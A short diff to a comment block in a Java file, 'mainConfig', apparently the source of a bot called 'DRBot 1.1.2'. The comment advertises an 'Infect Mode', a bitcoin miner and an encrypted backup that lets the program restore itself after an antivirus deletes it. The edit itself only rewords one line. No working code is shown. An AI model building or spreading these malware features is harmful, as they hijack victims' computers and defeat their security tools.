@@ -31,7 +31,7 @@ public class mainConfig{
     Aim: ~~~~ Pinging ~~~~
     Functionaliy: ~~~~ On the List ~~~~
     Version: DRBot 1.1.2 ~ Infect Mode Ver + Bitcoin Miner + Enc applicable Vers.
-    Strength: Strong .... have its own encrypted backup if an antivirus found it and delete it,
+    Strength: Strong! have its own encrypted backup if an antivirus find and delete it,
                 and ofcourse it will recover/heal itself. ;)
     */
     
